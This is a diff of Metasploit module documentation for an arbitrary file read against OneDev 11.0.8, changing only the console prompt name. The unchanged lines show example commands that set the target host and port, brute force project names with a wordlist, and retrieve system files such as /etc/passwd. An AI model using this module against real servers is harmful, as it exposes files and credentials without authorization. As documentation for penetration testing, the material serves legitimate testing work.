@@ -60,13 +60,13 @@ If set as `true`, the target file contents will be stored as loot. Set as `false
 ### Example: Known project name or anonymous access enabled on OneDev 11.0.8
 
 ```
-msf6 auxiliary(gather/onedev_arbitrary_file_read) > set RHOSTS 192.168.1.10
+msf auxiliary(gather/onedev_arbitrary_file_read) > set RHOSTS 192.168.1.10
 RHOSTS => 192.168.1.10
-msf6 auxiliary(gather/onedev_arbitrary_file_read) > set RPORT 6610
+msf auxiliary(gather/onedev_arbitrary_file_read) > set RPORT 6610
 RPORT => 6610
-msf6 auxiliary(gather/onedev_arbitrary_file_read) > set PROJECT_NAME myproject
+msf auxiliary(gather/onedev_arbitrary_file_read) > set PROJECT_NAME myproject
 PROJECT_NAME => myproject
-msf6 auxiliary(gather/onedev_arbitrary_file_read) > run
+msf auxiliary(gather/onedev_arbitrary_file_read) > run
 [*] Running module against 192.168.1.10
 
 [+] Target file retrieved with success
@@ -97,13 +97,13 @@ messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
 
 ### Example: Unknown projects with anonymous access disabled on OneDev 11.0.8
 ```
-msf6 auxiliary(gather/onedev_arbitrary_file_read) > set RHOSTS 192.168.1.10
+msf auxiliary(gather/onedev_arbitrary_file_read) > set RHOSTS 192.168.1.10
 RHOSTS => 192.168.1.10
-msf6 auxiliary(gather/onedev_arbitrary_file_read) > set RPORT 6610
+msf auxiliary(gather/onedev_arbitrary_file_read) > set RPORT 6610
 RPORT => 6610
-msf6 auxiliary(gather/onedev_arbitrary_file_read) > set PROJECT_NAMES_FILE /home/server/wordlist.txt
+msf auxiliary(gather/onedev_arbitrary_file_read) > set PROJECT_NAMES_FILE /home/server/wordlist.txt
 PROJECT_NAMES_FILE => /home/server/wordlist.txt
-msf6 auxiliary(gather/onedev_arbitrary_file_read) > run
+msf auxiliary(gather/onedev_arbitrary_file_read) > run
 [*] Running module against 192.168.1.10
 
 [*] Brute forcing valid project name ...
